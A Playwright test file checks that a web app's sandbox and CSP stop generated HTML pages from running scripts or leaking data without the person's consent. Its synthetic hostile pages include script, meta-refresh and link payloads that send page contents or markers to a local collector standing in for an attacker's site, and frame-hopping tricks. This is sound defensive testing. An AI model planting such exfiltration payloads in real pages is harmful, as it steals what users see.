/**
 * The consent boundary for generated pages (F05, ADR-0085), in a real Chromium against a harness of its own. The harness
 * serves synthetic hostile pages with byway's real response headers (artifactHeaders, pageScriptsGranted) and the app's
 * real CSP (next.config.ts) on its own loopback port; a collector on another port stands for any other site. Every path
 * by which a page could run its scripts without the person's consent, or carry what it holds away, must leave the
 * collector empty; a frame the person turned scripts on for must run them.
 *
 * It needs no demo data and no byway server: the seeded e2e (artifact-views.spec.ts) drives the same rules through the
 * real app.
 */
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { expect, test, type Page } from '@playwright/test';
import { configFor } from '../next.config.ts';
import { artifactHeaders, pageScriptsGranted } from '../src/server/artifacts.ts';
import { startCollector, type Collector } from './collector.ts';

/** The synthetic pages, by name. Each tries to reach the collector `C` with something it holds. */
function pages(C: string): Record<string, string> {
  return {
    // A script that says it ran (to the frame's parent, which is the page itself at the top level), then leaves.
    script: `<!doctype html><title>s</title><p>SECRET_SCRIPT</p><script>parent.postMessage('ran:script', '*'); location.href = '${C}/hit?via=script&data=' + encodeURIComponent(document.body.innerText);</script>`,
    // No JavaScript at all: a meta refresh, which allow-scripts would also re-enable.
    meta: `<!doctype html><title>m</title><meta http-equiv="refresh" content="0;url=${C}/hit?via=meta&data=SECRET_META"><p>SECRET_META</p>`,
    // Links a person might click, in the page itself, a new tab and the whole window.
    link: `<!doctype html><title>l</title><p>SECRET_LINK</p><a id="self" href="${C}/hit?via=link-self">Read more</a> <a id="blank" target="_blank" href="${C}/hit?via=link-blank">New tab</a> <a id="top" target="_top" href="${C}/hit?via=link-top">Whole window</a>`,
    // A consented page that moves its frame to another page's consent address, to take that page's scripts too.
    hopper: `<!doctype html><title>h</title><script>parent.postMessage('ran:hopper', '*'); location.href = '/artifacts/script?scripts=1';</script>`,
    // A consented page that reloads itself: the reload is the frame's own request, not the person's.
    reloader: `<!doctype html><title>r</title><script>if (window.name !== 'reloaded') { window.name = 'reloaded'; parent.postMessage('ran:first', '*'); location.reload(); } else { parent.postMessage('ran:again', '*'); location.href = '${C}/hit?via=reload'; }</script>`,
  };
}

/** The app's own CSP for its screens, from next.config.ts. */
async function appCsp(): Promise<string> {
  const rules = (await configFor({}).headers?.()) ?? [];
  const csp = rules.flatMap((r) => r.headers).find((h) => h.key === 'Content-Security-Policy')?.value;
  if (!csp) throw new Error('next.config.ts has no app CSP');
  return csp;
}

interface Asked {
  path: string;
  dest: string | null;
  site: string | null;
  granted: boolean;
}

interface Harness {
  origin: string;
  asked: Asked[];
  close(): Promise<void>;
}

const escape = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');

async function startHarness(collector: Collector): Promise<Harness> {
  const csp = await appCsp();
  const asked: Asked[] = [];
  let origin = '';
  const server = http.createServer((req, res) => {
    const url = new URL(req.url ?? '/', origin);
    const headers = new Headers();
    for (const [k, v] of Object.entries(req.headers)) if (typeof v === 'string') headers.set(k, v);
    const artifact = /^\/artifacts\/([a-z]+)$/.exec(url.pathname);
    if (artifact) {
      const body = pages(collector.origin)[artifact[1] as string];
      if (!body) {
        res.writeHead(404).end();
        return;
      }
      // As artifactResponse does: an ask for scripts is granted only by pageScriptsGranted, never with a download.
      const download = url.searchParams.get('download') === '1' ? 'page' : undefined;
      const granted = download === undefined && pageScriptsGranted(url, headers);
      asked.push({ path: url.pathname + url.search, dest: headers.get('sec-fetch-dest'), site: headers.get('sec-fetch-site'), granted });
      res.writeHead(200, artifactHeaders('text/html', origin, download, { asked: url.searchParams.has('scripts'), granted })).end(body);
      return;
    }
    // App screens: a frame (as ScaledPage and PageResult show a page), or an Open link, under the app's own CSP.
    const frame = url.searchParams.get('frame');
    const link = url.searchParams.get('link');
    const sandbox = url.searchParams.get('sandbox') ?? '';
    const app =
      url.pathname === '/app' && frame !== null
        ? `<iframe id="page" src="${escape(frame)}" sandbox="${escape(sandbox)}" style="width:800px;height:400px"></iframe>`
        : url.pathname === '/app' && link !== null
          ? `<a id="open" href="${escape(link)}" target="_blank" rel="noopener noreferrer">Open</a>`
          : null;
    if (app !== null) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Content-Security-Policy': csp, 'Cache-Control': 'no-store' }).end(`<!doctype html><title>app</title>${app}`);
      return;
    }
    // The control: a page with no sandbox at all, whose script reaches the collector, so an empty collector means something.
    if (url.pathname === '/control') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }).end(`<!doctype html><script>location.href = '${collector.origin}/hit?via=control';</script>`);
      return;
    }
    res.writeHead(404).end();
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  return {
    origin,
    asked,
    close: () =>
      new Promise<void>((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}

let collector: Collector;
let harness: Harness;

test.beforeAll(async () => {
  collector = await startCollector();
  harness = await startHarness(collector);
});

test.afterAll(async () => {
  await harness?.close();
  await collector?.close();
});

test.beforeEach(async ({ page }) => {
  collector.clear();
  harness.asked.splice(0);
  // Messages the page's frames post to it ("ran:…"), recorded before any of the page's own scripts run.
  await page.addInitScript(() => {
    const w = window as unknown as { __messages?: string[] };
    w.__messages = [];
    window.addEventListener('message', (e) => w.__messages?.push(String(e.data)));
  });
});

const messages = (page: Page) => page.evaluate(() => (window as unknown as { __messages?: string[] }).__messages ?? []);
/** Long enough for a script, a meta refresh or a followed link to have reached the collector. */
const settle = (page: Page) => page.waitForTimeout(1500);

test('control: a page without byway’s sandbox reaches the collector, so an empty collector means something', async ({ page }) => {
  await page.goto(`${harness.origin}/control`);
  await expect.poll(() => collector.hits()).toContainEqual(expect.stringContaining('via=control'));
});

test('opened at the top level, a page runs nothing: its address, with or without ?scripts=1, and a meta refresh', async ({ page }) => {
  for (const path of ['/artifacts/script', '/artifacts/script?scripts=1', '/artifacts/meta', '/artifacts/meta?scripts=1']) {
    const res = await page.goto(`${harness.origin}${path}`);
    expect(res?.headers()['content-security-policy'], path).toMatch(/(^|; )sandbox$/);
    await settle(page);
  }
  expect(harness.asked.every((a) => !a.granted)).toBe(true);
  expect(collector.hits()).toEqual([]);
});

// F05 (a): the review's acceptance named history restoration, which the reload above does not cover. Back and Forward
// bring a full-size view back from the back-forward cache, or from the HTTP cache (its page is cached for a year), with
// the headers it was served with: it must run nothing either way.
test('a full-size view brought back by Back and Forward runs nothing, from the back-forward cache or not', async ({ page }) => {
  for (const path of ['/artifacts/script', '/artifacts/script?scripts=1', '/artifacts/meta']) {
    const view = `${harness.origin}${path}`;
    await page.goto(view);
    await settle(page);
    await page.goto(`${harness.origin}/app?link=${encodeURIComponent(path)}`);
    await page.goBack();
    expect(page.url(), path).toBe(view);
    await settle(page);
    await page.goForward();
    await page.goBack();
    expect(page.url(), path).toBe(view);
    await settle(page);
  }
  expect(harness.asked.every((a) => !a.granted)).toBe(true);
  expect(collector.hits()).toEqual([]);
});

test('an Open link to a page’s address opens it inert in the new tab', async ({ page, context }) => {
  for (const link of ['/artifacts/script', '/artifacts/script?scripts=1', '/artifacts/meta']) {
    await page.goto(`${harness.origin}/app?link=${encodeURIComponent(link)}`);
    const opened = context.waitForEvent('page');
    await page.locator('#open').click();
    const tab = await opened;
    await tab.waitForLoadState();
    await settle(tab);
    await tab.close();
  }
  expect(harness.asked.filter((a) => a.dest === 'document').length).toBeGreaterThanOrEqual(3);
  expect(harness.asked.every((a) => !a.granted)).toBe(true);
  expect(collector.hits()).toEqual([]);
});

test('a frame with scripts off runs nothing, even when it asks; and no link in it can leave byway', async ({ page }) => {
  // Asked for, but the frame's sandbox has no scripts: the server grants, the sandbox still holds (two layers).
  await page.goto(`${harness.origin}/app?frame=${encodeURIComponent('/artifacts/script?scripts=1')}&sandbox=`);
  await settle(page);
  await page.goto(`${harness.origin}/app?frame=${encodeURIComponent('/artifacts/meta')}&sandbox=`);
  await settle(page);
  for (const id of ['#self', '#blank', '#top']) {
    await page.goto(`${harness.origin}/app?frame=${encodeURIComponent('/artifacts/link')}&sandbox=`);
    await page.frameLocator('#page').locator(id).click();
    await settle(page);
  }
  expect(await messages(page)).toEqual([]);
  expect(collector.hits()).toEqual([]);
});

test('a frame the person turned scripts on for runs them, and still cannot carry the page to another site', async ({ page }) => {
  await page.goto(`${harness.origin}/app?frame=${encodeURIComponent('/artifacts/script?scripts=1')}&sandbox=allow-scripts`);
  await expect.poll(() => messages(page)).toContain('ran:script');
  await settle(page);
  expect(harness.asked).toContainEqual({ path: '/artifacts/script?scripts=1', dest: 'iframe', site: 'same-origin', granted: true });
  // Its script then navigated itself to the collector: the app's frame-src 'self' refused that.
  expect(collector.hits()).toEqual([]);
});

test('a consented frame cannot take another page’s scripts by moving itself to that page’s ?scripts=1', async ({ page }) => {
  await page.goto(`${harness.origin}/app?frame=${encodeURIComponent('/artifacts/hopper?scripts=1')}&sandbox=allow-scripts`);
  await expect.poll(() => messages(page)).toContain('ran:hopper');
  await expect.poll(() => harness.asked.map((a) => a.path)).toContain('/artifacts/script?scripts=1');
  await settle(page);
  // The hop was the frame's own request, from an opaque origin: not same-origin, so not granted.
  expect(harness.asked.find((a) => a.path === '/artifacts/script?scripts=1')).toMatchObject({ dest: 'iframe', granted: false });
  expect(await messages(page)).not.toContain('ran:script');
  expect(collector.hits()).toEqual([]);
});

test('a consented frame that reloads itself comes back with scripts off (fails closed)', async ({ page }) => {
  await page.goto(`${harness.origin}/app?frame=${encodeURIComponent('/artifacts/reloader?scripts=1')}&sandbox=allow-scripts`);
  await expect.poll(() => messages(page)).toContain('ran:first');
  await expect.poll(() => harness.asked.filter((a) => a.path === '/artifacts/reloader?scripts=1').length).toBe(2);
  await settle(page);
  expect(harness.asked.filter((a) => a.path === '/artifacts/reloader?scripts=1').map((a) => a.granted)).toEqual([true, false]);
  expect(await messages(page)).not.toContain('ran:again');
  expect(collector.hits()).toEqual([]);
});
